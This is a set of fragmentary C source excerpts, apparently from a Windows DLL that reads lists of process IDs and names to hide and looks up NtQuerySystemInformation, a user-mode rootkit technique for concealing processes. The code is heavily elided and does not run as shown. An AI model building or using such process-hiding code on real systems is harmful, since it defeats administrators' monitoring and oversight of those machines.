...
BOOL strcmp_ignorecase(LPCSTR a, LPCSTR b) //easier to implement than use existing functions
{
	int i = 0;
	TCHAR ax = a[0], bx = b[0];
...
#endif
		if (!strcmp_ignorecase(name, hiddenProcessNames[i]))
			return TRUE;
	}
	return FALSE;
...
int buildProcNameList(const TCHAR *optarg, BOOL includeSelf, TCHAR ***outStrBuffer)
{
	...
	if (strlen(optarg) == 0)
		return 0;
	*outStrBuffer = (TCHAR **)malloc(sizeof(TCHAR*)*strlen(optarg));
	...
	if (includeSelf)
	{
		...
		strcpy_s((*outStrBuffer)[i], (1 + strlen(tmpSelfBuffer)), tmpSelfBuffer);
		i++;
	}
	pwc = strtok_s(str_buffer, delim, &context);
	while (pwc != NULL)
	{
		...
		(*outStrBuffer)[i] = (TCHAR *)malloc(SizeOfStr);
		strcpy_s((*outStrBuffer)[i], (1 + strlen(pwc)), pwc);
		i++;
		pwc = strtok_s(NULL, delim, &context);
	}
	free(str_buffer);
...
void InitializeDLL(pArgStruct args)
{
	...
	if (args == NULL)
	{
		...
		FILE *fp;		 
			...
			fgets(pIDsbuff, MAX_LINE, fp); //first line - list of pIDs to hide	
			fgets(procNameBuff, MAX_LINE, fp); //second line - list of process names to hide		
			pIDsbuff[strlen(pIDsbuff) - 1] = '\0'; //delete \n		
			procNameBuff[strlen(procNameBuff) - 1] = '\0';		
			fclose(fp);	
	...
	else
	{
		...
		size_t hiddenPIDsListSize = sizeof(int)*PIDsNum;
	...
	OrigAddress = (PNtQueryFunc)GetProcAddress(LoadLibrary("ntdll.dll"), "NtQuerySystemInformation");
